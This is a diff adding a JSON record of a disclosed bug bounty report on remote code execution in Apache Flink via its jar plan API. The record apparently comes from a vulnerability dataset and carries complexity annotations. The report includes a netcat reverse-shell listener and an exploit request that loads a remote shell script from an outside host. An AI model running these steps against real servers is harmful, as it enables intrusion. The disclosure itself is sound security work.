@@ -1,0 +1,53 @@
+{
+  "reported_to": "Aiven Ltd",
+  "reported_by": "jarij ",
+  "title": "Apache Flink RCE via GET jar/plan API Endpoint",
+  "content": "\nSummary:\nAiven has not restricted access to the GET jars/{jar_id}/plan API. This endpoint can be used to load java class files with the specified arguments that are in the java classpath on the server. This can be abused to gain RCE on the Apache Flink Server.\nSteps To Reproduce:\nThe video below shows how to setup the Apache Flink instance and run the PoC. Feel free to use my VPS which will make triaging somewhat easier (ssh \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, password: \u2588\u2588\u2588\u2588\u2588\u2588):\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nLogin to my aiven account: \u2588\u2588\u2588\u2588, password: \u2588\u2588\u2588\u2588\u2588\u2588\nRun the SQL job as demonstrated in the video\nOpen the Flink Web UI and verify that there is a new job in the jobs panel.\nSetup netcat reverse shell listener on the VPS: nc -n -lvp 8888\nUpdate the poc.py variables to match your instance, if you are not using my Apache Flink instance\nRun the poc: python3 poc.py\nReverse shell connection should pop up\nAfter connection has been closed, the Apache Flink will crash, so the Aiven service daemon will have to restart it. Because of this, you have to run new SQL job after every time you run the poc script\nAPI Request\nHere's the HTTP API request that exploits the issue:\nCode 717 Bytes\n1GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load(\"https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js\")&parallelism=1 HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\n3Connection: keep-alive\n4Pragma: no-cache\n5Cache-Control: no-cache\n6Authorization: Basic \u2588\u2588\u2588\u2588\u2588\n7sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\n8Accept: application/json, text/plain, */*\n9sec-ch-ua-mobile: ?0\n10User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\n11sec-ch-ua-platform: \"Windows\"\n12Sec-Fetch-Site: same-origin\n13Sec-Fetch-Mode: cors\n14Sec-Fetch-Dest: empty\n15Accept-Language: en-US,en;q=0.9,fi;q=0.8\nImpact\nAttacker can execute commands on the server and use this access to potentially pivot into other resources in the network.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 6000,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1667907000,
+  "report_url": "https://hackerone.com/reports/1418891",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Login to the Aiven account and run an SQL job to create a new job in the Flink Web UI."
+    ],
+    [
+      2,
+      "Set up a netcat reverse shell listener on a VPS."
+    ],
+    [
+      3,
+      "Modify and run the provided PoC script (poc.py) to exploit the GET jars/{jar_id}/plan API endpoint."
+    ],
+    [
+      4,
+      "Observe the reverse shell connection to gain RCE on the Apache Flink Server."
+    ]
+  ],
+  "vuln_description": "The vulnerability involves unrestricted access to the GET jars/{jar_id}/plan API endpoint in Apache Flink, which allows loading Java class files with specified arguments from the server's classpath. This can be exploited to achieve Remote Code Execution (RCE) on the server.",
+  "reason": "The attack requires knowledge of the specific API endpoint and how to manipulate it to load malicious Java classes. It also involves setting up a reverse shell and understanding the interaction between the API and the server's classpath. However, the steps are somewhat straightforward once the endpoint's functionality is understood.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an API endpoint that is not properly restricted, allowing unauthorized access to execute arbitrary code. The methodology described involves testing for authorization boundaries by swapping user sessions and resource IDs, which would not directly apply here since the issue is about an unprotected endpoint rather than a misconfiguration in user permissions or resource access.",
+    "is_detectable": false
+  }
+}
